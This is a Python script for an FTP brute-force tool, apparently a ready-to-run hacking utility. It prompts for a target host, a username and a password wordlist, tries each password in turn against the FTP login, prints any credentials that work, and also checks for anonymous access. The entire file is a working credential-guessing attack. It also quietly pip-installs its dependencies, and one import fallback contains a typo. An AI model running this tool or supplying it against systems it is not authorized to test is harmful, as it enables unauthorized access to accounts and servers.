import sys
from ftplib import FTP
import os
import platform

print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystylle import *
    try:
        import colorama
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
colorama.deinit()
banner = Center.XCenter("""
         _______ _____ ____       ____  ____  _   _ _____ _____ _______
        / /  ___|_   _|  _ \     | __ )|  _ \| | | |_   _|___ /| ____\ \`
       | || |_    | | | |_) |____|  _ \| |_) | | | | | |   |_ \|  _|  | |
      < < |  _|   | | |  __/_____| |_) |  _ <| |_| | | |  ___) | |___  > >
       | ||_|     |_| |_|        |____/|_| \_\`\___/  |_| |____/|_____|| |
        \_\                                                          /_/
                            \n\n
""")


def check_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print("\n[+] Anonymous login is open.")
        print("\n[+] Username : anonymous")
        print("\n[+] Password : anonymous\n")
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    print(termcolor.colored(f"Username: {username}  | Password: {password}", 'blue'))
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print(termcolor.colored("\n[✔] Credentials have found.", 'green'))
        print(termcolor.colored("\n[✔] Username : {}".format(username), 'cyan'))
        print(termcolor.colored("\n[✔] Password : {}".format(password), 'yellow'))
        sys.exit(0)
    except:
        pass


def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target, username, word)

    except:
        print(termcolor.colored("[X] No password List Found!", 'red'))
        sys.exit(0)


os.system('cls' if os.name == 'nt' else 'clear')
print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
try:
    target = input(termcolor.colored("\n[*] Enter target ip/Host:- ", 'green'))
    username = input(termcolor.colored("\n[*] Enter Username:- ", 'green'))
    wordlist = input(termcolor.colored("\n[*] Enter Path Of Password List:- ", 'green'))
    print('\n')

except KeyboardInterrupt:
    print(termcolor.colored("[X] You Pressed The Exit Button!", 'red'))
    quit()

brute_force(target, username, wordlist)
check_anonymous_login(target)
print(termcolor.colored("[*] Completed...\n", 'blue'));
